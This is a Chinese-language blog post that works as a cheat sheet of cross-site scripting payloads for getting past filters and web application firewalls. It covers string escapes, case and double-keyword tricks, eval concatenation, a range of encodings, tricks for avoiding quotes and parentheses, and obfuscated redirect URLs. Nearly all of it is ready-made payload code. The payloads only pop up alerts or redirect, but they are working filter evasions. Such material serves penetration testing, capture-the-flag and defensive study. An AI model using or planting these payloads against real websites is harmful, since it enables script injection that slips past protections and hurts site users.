---
title: XSS-bypass
subtitle:
date: 2024-08-15T09:31:01+08:00
slug: 125
draft:  false
author: 
  name: 东隅
  link:
  email: 735587142@qq.com
  avatar: 
description:
keywords:
license:
comment: false
weight: 0
tags:
  - OWASP
  - XSS
categories:
  - OWASP
hiddenFromHomePage: false
hiddenFromSearch: false
hiddenFromRss: false
hiddenFromRelated: false
summary:
resources:
  - name: featured-image
    src: featured-image.jpg
  - name: featured-image-preview
    src: featured-image-preview.jpg
toc: true
math: false
lightgallery: false
password:
message:
repost:
  enable: true
  url:

# See details front matter: https://fixit.lruihao.cn/documentation/content-management/introduction/#front-matter
---

<!--more-->

## 转义

如果XSS上下文在一个带引号的字符串文字中，通常可以==跳出字符串直接执行JavaScript==。必须按照XSS上下文修复脚本，因为其中的任何语法错误都将阻止整个脚本执行。

以下是一些拆分字符串文字的有用方法：

'-alert(document.domain)-'

';alert(document.domain)//

如果进行了转义，可以采用html实体编码处理那个单引号

（\&apos;是一个HTML实体，表示单引号。因为==浏览器在解释JavaScript之前对onclick属性的值进行HTML解码==，所以实体被解码为引号，引号变成字符串分隔符，因此攻击成功）



具体情况具体分析，比如单引号转义而反斜杠不转义就可以利用`\'`这样的姿势逃逸单引号



## 过滤空格

用`/`代替空格

```html
<img/src="x"/onerror=alert("xss");>
```

## 过滤关键字

### 大小写绕过

```html
<ImG sRc=x onerRor=alert("xss");>
```

### 双写关键字

有些waf可能会只替换一次且是替换为空，这种情况下我们可以考虑双写关键字绕过

```html
<imimgg srsrcc=x onerror=alert("xss");>
```

### 字符拼接

利用eval

```html
<img src="x" onerror="a=`aler`;b=`t`;c='(`xss`);';eval(a+b+c)">
```

利用top

```html
<script>top["al"+"ert"](`xss`);</script>
```

### 其它字符混淆

有的waf可能是用正则表达式去检测是否有xss攻击，如果我们能fuzz出正则的规则，则我们就可以使用其它字符去混淆我们注入的代码了
下面举几个简单的例子

```html
可利用注释、标签的优先级等
1.<<script>alert("xss");//<</script>
2.<title><img src=</title>><img src=x onerror="alert(`xss`);"> //因为title标签的优先级比img的高，所以会先闭合title，从而导致前面的img标签无效
3.<SCRIPT>var a="\\";alert("xss");//";</SCRIPT>
```

### 编码绕过

Unicode编码绕过

```html
<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#34;&#120;&#115;&#115;&#34;&#41;&#59;">

<img src="x" onerror="eval('\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b')">
```

url编码绕过

```html
<img src="x" onerror="eval(unescape('%61%6c%65%72%74%28%22%78%73%73%22%29%3b'))">
<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
```

Ascii码绕过

```html
<img src="x" onerror="eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))">
```

hex绕过

```html
<img src=x onerror=eval('\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29')>
```

八进制

```html
<img src=x onerror=alert('\170\163\163')>
```

base64绕过

```html
<img src="x" onerror="eval(atob('ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw=='))">
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=">
```

## 过滤双引号，单引号

1.如果是html标签中，我们可以不用引号。如果是在js中，我们可以用反引号代替单双引号

```html
<img src="x" onerror=alert(`xss`);>
```

2.使用编码绕过，具体看上面我列举的例子，我就不多赘述了

## 过滤括号

当括号被过滤的时候可以使用throw来绕过

alert;throw 1

```html
<svg onload=alert("xss");>
<svg/onload="window.onerror=eval;throw'=alert\x281\x29';">
```

```html
<a οnmοuseοver="javascript:window.οnerrοr=alert;throw 1>
<img src=x οnerrοr="javascript:window.οnerrοr=alert;throw 1">
```



## 过滤<>

https://www.cnblogs.com/blacksunny/p/9248588.html

可以通过u003c和u003e来代替<和>，但是需要在script标签里

```
<div id='s'>
test
</div>
<script>
    var s = "u003cimg src=1 onerror=alert(/xss/)u003e";
    document.getElementById('s').innerHTML = s;
</script>
```





## 过滤url地址

### 使用url编码

```html
<img src="x" onerror=document.location=`http://%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d/`>
```

### 使用IP

1.十进制IP

```html
<img src="x" onerror=document.location=`http://2130706433/`>
```

2.八进制IP

```html
<img src="x" onerror=document.location=`http://0177.0.0.01/`>
```

3.hex

```html
<img src="x" onerror=document.location=`http://0x7f.0x0.0x0.0x1/`>
```

4.html标签中用`//`可以代替`http://`

```html
<img src="x" onerror=document.location=`//www.baidu.com`>
```

5.使用`\\`

```html
但是要注意在windows下\本身就有特殊用途，是一个path 的写法，所以\\在Windows下是file协议，在linux下才会是当前域的协议
```

6.使用中文逗号代替英文逗号
如果你在你在域名中输入中文句号浏览器会自动转化成英文的逗号

```html
<img src="x" onerror="document.location=`http://www。baidu。com`">//会自动跳转到百度
```



## 限制长度

国外的研究者terjanq 有一个集成式的短payload

https://tinyxss.terjanq.me/





## CSP

https://blog.csdn.net/weixin_50464560/article/details/120459380
